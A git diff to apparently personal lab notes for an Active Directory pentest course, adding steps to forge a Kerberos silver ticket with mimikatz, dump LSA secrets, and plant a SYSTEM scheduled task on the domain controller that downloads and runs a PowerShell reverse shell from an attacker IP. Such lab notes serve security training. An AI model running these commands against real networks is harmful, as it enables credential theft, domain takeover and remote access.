@@ -1108,6 +1108,9 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
 
 # Run this command on the mimikatz session
 lsadump::lsa /patch
+
+# Take Note of the "Domain :" output
+# This is the Domain SID that would be use often
 ```
 
 
@@ -1174,4 +1177,83 @@ gwmi -Class win32_computersystem -ComputerName dcorp-dc
 ![](https://i.imgur.com/btWJLpq.png)
 
 
+### **Getting Command Execution on domain controller, creating a silver ticket**
+
+### **Step 1 - Craft Silver Ticket**
+
+
+- First of extract secrets as shown earlier and note the output down
+- Now start up `mimikatz.exe`
+
+```powershell
+cd \AD\Tools
+.\mimikatz.exe
+```
+
+
+- Then run the command below replacing `/rc4` with **DCORP-DC$** NTLM and `/sid` with the **Domain :** output from the secret we extracted earlier
+
+```powershell
+kerberos::golden /user:Administrator /rc4:f5a2cef076a16742b123b8ed07c372c1 /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /domain:dollarcorp.moneycorp.local /service:HOST /startoffset:0 /endin:600 /renewmax:10080 /ptt
+
+# /sid: - Domain SID
+# /rc4: - DCORP-DC$ NTLM
+```
+
+
+- Then run the command below to know if you have permissions to viewing scheduling task
+
+```powershell
+exit
+schtasks /S dcorp-dc.dollarcorp.moneycorp.local
+
+
+
+<<Expected Output>>
+[SNIP]
+TaskName         Next Run Time          Status
+============================= ====== ===============
+Device Install Group Policy     N/A       Ready
+Device Install Reboot Required  N/A       Ready
+Sysprep Generalize Drivers      N/A       Ready
+
+Folder: \Microsoft\Windows\Power Efficiency Diagnostics
+TaskName         Next Run Time          Status
+===================== ============== ===============
+AnalyzeSystem             N/A                  Ready
+
+Folder: \Microsoft\Windows\PushToInstall
+TaskName         Next Run Time          Status
+============= ====================== ===============
+LoginCheck          N/A                    Disabled
+Registration        N/A                    Disabled
+
+Folder: \Microsoft\Windows\Ras
+TaskName         Next Run Time          Status
+============= ====================== ===============
+MobilityManager    N/A                    Ready
+[SNIP]
+```
+
+**Note That if you get an "Error: Access is denied", you probably did the wrong thing**
+
+
+### **Step 2 - Gain Reverse Shell**
+
+
+- [ ] **_Create Invoke-PowerShellTcpEx.ps1:_**
+
+	- Create a copy of **Invoke-PowerShellTcp.ps1** and rename it to **Invoke-PowerShellTcpEx.ps1**.
+	
+	- Open **Invoke-PowerShellTcpEx.ps1** in PowerShell ISE
+	
+	- Add -  `Power -Reverse -IPAddress 172.16.100.X -Port 443` - to the end of the file and save.
+
+
+
+-  On this same session run this 
+
+```powershell
+schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "sec-fortress" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/Invoke-PowerShellTcpEx.ps1''')'"
+```
 
